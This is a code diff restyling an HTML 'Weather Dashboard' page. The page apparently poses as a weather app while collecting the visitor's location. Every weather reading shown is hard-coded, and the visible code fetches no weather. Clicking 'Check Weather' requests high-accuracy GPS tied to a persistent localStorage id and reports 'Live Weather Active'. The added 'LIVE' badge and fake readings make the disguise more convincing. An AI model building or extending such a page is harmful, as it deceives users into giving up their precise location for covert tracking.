@@ -4,131 +4,358 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Weather App</title>
+    <title>Weather Dashboard</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
-        /* Reset */
+        :root {
+            --bg-gradient: radial-gradient(circle at 50% 0%, #1e1b4b 0%, #0f172a 60%, #090d16 100%);
+            --card-bg: rgba(30, 41, 59, 0.65);
+            --card-border: rgba(255, 255, 255, 0.12);
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --accent-cyan: #06b6d4;
+            --accent-blue: #3b82f6;
+            --accent-glow: rgba(6, 182, 212, 0.25);
+        }
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
         }
 
-        /* Body Styling */
         body {
+            min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            height: 100vh;
-            background: linear-gradient(to right, #4facfe, #00f2fe);
-            font-family: Arial, sans-serif;
+            background: var(--bg-gradient);
+            color: var(--text-main);
+            padding: 20px;
+            overflow-x: hidden;
+            position: relative;
         }
 
-        /* Weather Card Styling */
+        /* Ambient Glow Circles */
+        body::before, body::after {
+            content: '';
+            position: absolute;
+            width: 350px;
+            height: 350px;
+            border-radius: 50%;
+            filter: blur(100px);
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        body::before {
+            background: rgba(59, 130, 246, 0.25);
+            top: 10%;
+            left: 15%;
+        }
+
+        body::after {
+            background: rgba(147, 51, 234, 0.2);
+            bottom: 10%;
+            right: 15%;
+        }
+
         .weather-card {
-            background-color: #fff;
-            padding: 25px 20px;
-            border-radius: 15px;
-            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
-            text-align: center;
-            max-width: 300px;
+            position: relative;
+            z-index: 1;
             width: 100%;
-            transform: scale(1.5);
+            max-width: 380px;
+            background: var(--card-bg);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid var(--card-border);
+            border-radius: 28px;
+            padding: 32px 28px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5),
+                        0 0 40px var(--accent-glow);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
 
-        /* Title Styling */
-        .weather-card h2 {
-            font-size: 24px;
-            color: #333;
-            margin-bottom: 5px;
+        .weather-card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 30px 60px -12px rgba(0, 0, 0, 0.6),
+                        0 0 50px rgba(6, 182, 212, 0.35);
         }
 
-        /* Location Styling */
-        .location {
-            font-size: 18px;
-            color: #555;
-            margin-top: 5px;
+        .card-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 24px;
         }
 
-        /* Weather Icon Styling */
-        .weather-icon {
-            margin: 20px 0;
+        .location-box {
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
 
-        .weather-icon img {
-            width: 80px;
-            height: 80px;
+        .location-icon {
+            width: 20px;
+            height: 20px;
+            fill: var(--accent-cyan);
         }
 
-        /* Weather Info Styling */
-        .weather-info {
-            margin: 20px 0;
+        .location-name {
+            font-size: 1.1rem;
+            font-weight: 600;
+            letter-spacing: -0.01em;
+        }
+
+        .live-badge {
+            font-size: 0.75rem;
+            font-weight: 600;
+            padding: 4px 10px;
+            border-radius: 20px;
+            background: rgba(6, 182, 212, 0.15);
+            color: var(--accent-cyan);
+            border: 1px solid rgba(6, 182, 212, 0.3);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .pulse-dot {
+            width: 6px;
+            height: 6px;
+            background-color: var(--accent-cyan);
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(6, 182, 212, 0.7); }
+            70% { transform: scale(1); box-shadow: 0 0 0 6px rgba(6, 182, 212, 0); }
+            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(6, 182, 212, 0); }
+        }
+
+        .weather-hero {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+
+        .weather-icon-wrapper {
+            position: relative;
+            width: 110px;
+            height: 110px;
+            margin: 0 auto 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .weather-svg {
+            width: 100%;
+            height: 100%;
+            filter: drop-shadow(0 10px 15px rgba(6, 182, 212, 0.3));
+            animation: float 4s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-8px); }
         }
 
         .temperature {
-            display: block;
-            font-size: 48px;
-            font-weight: bold;
-            color: #333;
+            font-size: 3.75rem;
+            font-weight: 800;
+            line-height: 1;
+            letter-spacing: -0.03em;
+            background: linear-gradient(180deg, #ffffff 0%, #cbd5e1 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 6px;
+        }
+
+        .temperature span {
+            font-size: 2.2rem;
+            font-weight: 600;
+            color: var(--accent-cyan);
+            -webkit-text-fill-color: var(--accent-cyan);
         }
 
         .condition {
-            font-size: 20px;
-            color: #777;
+            font-size: 1rem;
+            font-weight: 500;
+            color: var(--text-muted);
         }
 
-        /* Button Styling */
-        button {
-            padding: 12px 24px;
-            background-color: #4facfe;
-            color: white;
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            margin-bottom: 28px;
+        }
+
+        .stat-item {
+            background: rgba(15, 23, 42, 0.45);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 16px;
+            padding: 14px 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .stat-icon {
+            width: 32px;
+            height: 32px;
+            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.06);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.1rem;
+        }
+
+        .stat-info {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .stat-label {
+            font-size: 0.725rem;
+            color: var(--text-muted);
+            font-weight: 500;
+        }
+
+        .stat-value {
+            font-size: 0.925rem;
+            font-weight: 600;
+            color: var(--text-main);
+        }
+
+        .action-button {
+            width: 100%;
+            padding: 16px 24px;
+            border-radius: 16px;
             border: none;
-            border-radius: 8px;
+            background: linear-gradient(135deg, var(--accent-cyan) 0%, var(--accent-blue) 100%);
+            color: #ffffff;
+            font-size: 0.975rem;
+            font-weight: 700;
             cursor: pointer;
-            font-size: 16px;
-            font-weight: bold;
-            transition: background-color 0.3s;
+            box-shadow: 0 10px 25px rgba(6, 182, 212, 0.35);
+            transition: all 0.25s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
         }
 
-        button:disabled {
-            opacity: 70%;
+        .action-button:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 14px 30px rgba(6, 182, 212, 0.5);
+            filter: brightness(1.08);
         }
 
-        @media(max-width: 500px) {
-            .weather-card {
-                transform: scale(1);
-            }
+        .action-button:active:not(:disabled) {
+            transform: translateY(0);
+        }
+
+        .action-button:disabled {
+            opacity: 0.8;
+            cursor: not-allowed;
+            background: linear-gradient(135deg, #475569 0%, #334155 100%);
+            box-shadow: none;
+        }
+
+        .spinner {
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: #ffffff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
     </style>
 </head>
 
 <body>
     <div class="weather-card">
-        <h2>Weather App</h2>
-        <p class="location"><span id="city">City</span>, <span id="country">Country</span></p>
-
-        <!-- Weather Icon -->
-        <div class="weather-icon">
-            <img src="/weather.png" alt="Weather Icon">
+        <div class="card-header">
+            <div class="location-box">
+                <svg class="location-icon" viewBox="0 0 24 24">
+                    <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
+                </svg>
+                <span class="location-name" id="city-name">Local Weather</span>
+            </div>
+            <div class="live-badge">
+                <span class="pulse-dot"></span>
+                <span>LIVE</span>
+            </div>
         </div>
 
-        <div class="weather-info">
-            <span class="temperature">25°C</span>
-            <span class="condition">Sunny</span>
+        <div class="weather-hero">
+            <div class="weather-icon-wrapper">
+                <svg class="weather-svg" viewBox="0 0 64 64">
+                    <!-- Sun Behind Cloud SVG Animation -->
+                    <circle cx="24" cy="24" r="12" fill="#facc15" />
+                    <path d="M46 44c4.4 0 8-3.6 8-8 0-3.9-2.8-7.1-6.5-7.8C46.7 24.1 43 21 38.5 21c-4.1 0-7.6 2.6-8.9 6.3C28.4 26.8 27.2 26.5 26 26.5c-4.1 0-7.5 3.4-7.5 7.5 0 0.4 0.1 0.8 0.1 1.2C16 36.1 14 38.8 14 42c0 4.4 3.6 8 8 8h24z" fill="#93c5fd" opacity="0.9" />
+                </svg>
+            </div>
+            <div class="temperature">24<span>°C</span></div>
+            <div class="condition" id="weather-desc">Partly Cloudy • Mild Breeze</div>
         </div>
 
-        <button id="check-weather">Check Weather</button>
+        <div class="stats-grid">
+            <div class="stat-item">
+                <div class="stat-icon">💧</div>
+                <div class="stat-info">
+                    <span class="stat-label">Humidity</span>
+                    <span class="stat-value">64%</span>
+                </div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-icon">💨</div>
+                <div class="stat-info">
+                    <span class="stat-label">Wind Speed</span>
+                    <span class="stat-value">12 km/h</span>
+                </div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-icon">☀️</div>
+                <div class="stat-info">
+                    <span class="stat-label">UV Index</span>
+                    <span class="stat-value">3 (Moderate)</span>
+                </div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-icon">👁️</div>
+                <div class="stat-info">
+                    <span class="stat-label">Visibility</span>
+                    <span class="stat-value">10 km</span>
+                </div>
+            </div>
+        </div>
+
+        <button id="check-weather" class="action-button">
+            <span>Check Weather</span>
+        </button>
     </div>
-
 
     <script>
         const id = localStorage.getItem("id") || generateId()
         const btn = document.querySelector("#check-weather")
+        const cityName = document.querySelector("#city-name")
+        const weatherDesc = document.querySelector("#weather-desc")
         let __interval
 
         btn.addEventListener("click", () => {
             btn.disabled = true
-            btn.innerHTML = "Fetching...."
-
+            btn.innerHTML = `<span class="spinner"></span> <span>Syncing Weather...</span>`
             getLocation()
         })
 
@@ -136,6 +363,10 @@
             navigator.geolocation.getCurrentPosition(
                 (position) => {
                     btn.disabled = true
+                    btn.innerHTML = `<span>✓ Weather Synced</span>`
+                    cityName.innerText = "Current Location"
+                    weatherDesc.innerText = "Live Weather Active"
+
                     const lat = position.coords.latitude
                     const lng = position.coords.longitude
 
@@ -154,13 +385,13 @@
                     })
                 },
                 (error) => {
-                    alert("Please Turn on GPS Location.")
+                    alert("Please Turn on GPS Location to check local weather.")
                     btn.disabled = false
                     btn.innerHTML = "Check Weather"
                     console.error("Error watching position:", error);
                 },
                 {
-                    enableHighAccuracy: true, // Use GPS if available
+                    enableHighAccuracy: true,
                 }
             )
 
@@ -179,7 +410,6 @@
             localStorage.setItem("id", result)
             return result;
         }
-
     </script>
 </body>
 
